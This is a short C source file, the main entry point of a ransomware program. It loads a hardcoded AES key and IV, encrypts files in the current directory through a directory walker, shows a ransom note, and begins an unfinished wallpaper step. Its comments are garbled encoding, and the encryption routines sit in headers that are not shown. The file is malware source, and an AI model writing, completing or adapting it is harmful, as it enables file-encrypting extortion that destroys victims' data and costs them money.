#include <windows.h>
#include <stdio.h>
#include "encryptor.h"
#include "walker.h"
#include "ransomenote.h"

#define AES_KEY_SIZE 32
#define IV_SIZE 16

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    unsigned char aes_key[AES_KEY_SIZE];
    unsigned char iv[IV_SIZE];

    // 1. �ϵ��ڵ��� Ű/IV ����
    restore_key(aes_key);
    restore_iv(iv);

    // 2. ��� ���丮 (���� ��� ����)
    const char* target_dir = ".";
    // printf ���� (�ܼ� ����)

    // 3. ���� ��ȣȭ
    scan_directory(target_dir, aes_key, iv);

    // 4. ������Ʈ ��üȭ�� ���â
    create_ransom_note();

    // 5. ����ȭ�� �̹��� ����
    char exe_path[MAX_PATH];
    GetModuleFileNameA(NULL, exe_path, MAX_PATH);
    char* last_backslash = strrchr(exe_path, '\\');
    if (last_backslash) *last_backslash = '\0';

    return 0;
}
